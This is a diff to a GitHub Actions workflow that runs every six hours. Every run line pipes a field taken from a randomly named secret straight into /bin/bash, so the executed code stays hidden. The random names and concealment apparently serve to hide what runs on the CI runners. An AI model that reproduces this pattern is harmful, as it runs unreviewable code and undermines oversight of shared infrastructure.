@@ -2,7 +2,7 @@ name: xiezhen19871010
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 3/6 * * *'
+    - cron: '34 3/6 * * *'
 
 jobs:
   build:
@@ -11,23 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: xiezhen19871010
         env:
-          ni742: ${{ secrets.ni742 }}
+          fdiz328: ${{ secrets.fdiz328 }}
         run: |
-          echo $ni742 | jq -r .ndxh97673 | /bin/bash
-          echo $yq3 | jq -r .vvj89093 | /bin/bash
-          echo $fceiz26 | jq -r .bz60316 | /bin/bash
-          echo $ezq082 | jq -r .ata2834 | /bin/bash
-          echo $ued2762 | jq -r .fvfso77883 | /bin/bash
-          echo $hwia38951 | jq -r .zodzn58251 | /bin/bash
-          echo $dlf43070 | jq -r .igvj433 | /bin/bash
-          echo $r390 | jq -r .va85449 | /bin/bash
-          echo $qd9075 | jq -r .ksujo930 | /bin/bash
-          echo $r17 | jq -r .lear73760 | /bin/bash
-          echo $qom68082 | jq -r .zmng58244 | /bin/bash
-          echo $c0 | jq -r .naqg69 | /bin/bash
-          echo $rdfan34 | jq -r .a07422 | /bin/bash
-          echo $czpd1875 | jq -r .wktnd976 | /bin/bash
-          echo $zedsz07376 | jq -r .indhm69 | /bin/bash
-          echo $lezpn9398 | jq -r .ehnl1667 | /bin/bash
-          echo $bzg12004 | jq -r .mjd00 | /bin/bash
+          echo $fdiz328 | jq -r .bh1 | /bin/bash
+          echo $oeec50 | jq -r .ar0899 | /bin/bash
+          echo $fkwib42 | jq -r .bq1347 | /bin/bash
+          echo $qpswa41 | jq -r .i00 | /bin/bash
+          echo $vkq320 | jq -r .bzqao81301 | /bin/bash
+          echo $v0764 | jq -r .amcr61 | /bin/bash
+          echo $yl2615 | jq -r .rrr4772 | /bin/bash
+          echo $eudpp10 | jq -r .sy24865 | /bin/bash
+          echo $hud8931 | jq -r .oyrz39547 | /bin/bash
 
